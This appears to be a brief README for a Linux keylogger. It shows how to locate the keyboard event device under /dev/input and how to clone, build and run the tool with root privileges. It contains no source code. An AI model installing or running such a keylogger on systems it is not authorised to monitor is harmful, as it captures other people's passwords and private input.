A keylogger for Linux operatins systems
## Usage 

Find the event for keyboard:
```bash
ls -l /dev/input/by-path/
```
find something like: event-kbd -> ../eventX

## Installation 
```bash
git clone https://github.com/alankurilov/keylogger 
cd keylogger 
make
sudo ./main eventX
```
